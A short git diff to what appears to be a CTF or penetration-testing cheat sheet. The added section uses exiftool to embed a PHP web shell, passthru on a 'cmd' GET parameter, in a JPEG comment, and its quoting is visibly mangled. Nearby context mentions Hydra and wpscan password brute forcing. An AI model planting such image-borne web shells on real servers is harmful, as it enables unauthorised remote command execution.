@@ -80,6 +80,12 @@ mv stegsolve.jar bin/
 strings image.jpg
 ```
 
+### Add php code in image
+
+```bash
+exiftool -Comment="<?php passthru($_GET’cmd’); _halt_compiler();" /root/picture.jpeg
+```
+
 ## Brute force passwords with HYDRA or wpscan
 
 ```bash
